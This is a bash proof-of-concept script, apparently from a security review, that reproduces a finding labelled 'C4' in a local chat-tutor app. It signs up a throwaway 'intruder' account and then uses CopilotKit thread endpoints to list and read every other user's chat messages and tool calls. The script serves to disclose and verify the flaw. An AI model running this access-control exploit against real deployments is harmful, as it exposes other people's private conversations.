#!/usr/bin/env bash
# C4: reproduce the high-severity finding. Chat with Bartholomew in the browser
# first, then run this. It signs up a fresh user and reads everybody else's chat.
#
#   bash demos/c4-thread-leak.sh [http://localhost:3000]
set -euo pipefail
BASE="${1:-http://localhost:3000}"
JAR="$(mktemp)"
trap 'rm -f "$JAR"' EXIT

EMAIL="intruder-$(date +%s)@example.com"
curl -sf -c "$JAR" -H "Origin: $BASE" -H "Content-Type: application/json" \
  -d "{\"name\":\"Intruder\",\"email\":\"$EMAIL\",\"password\":\"intruder-password-123\"}" \
  "$BASE/api/auth/sign-up/email" >/dev/null
echo "Signed up $EMAIL. Nothing below uses any other credential."

THREADS="$(curl -sf -b "$JAR" "$BASE/api/copilotkit/threads?agentId=tutor")"
echo "GET /api/copilotkit/threads?agentId=tutor"
echo "$THREADS" | jq -c '.'

for id in $(echo "$THREADS" | jq -r '.. | .threadId? // .id? // empty | select(startswith("tutor:"))' | sort -u); do
  echo
  echo "GET /api/copilotkit/threads/$id/messages"
  curl -sf -b "$JAR" "$BASE/api/copilotkit/threads/$(jq -rn --arg s "$id" '$s|@uri')/messages" |
    jq -r '.messages[] | select(.role == "user" or .role == "assistant") | "  \(.role): \(if (.content // "") != "" then .content else (.toolCalls // [] | map("[tool] " + .name + " " + .args) | join(", ")) end)"' |
    cut -c1-160
done
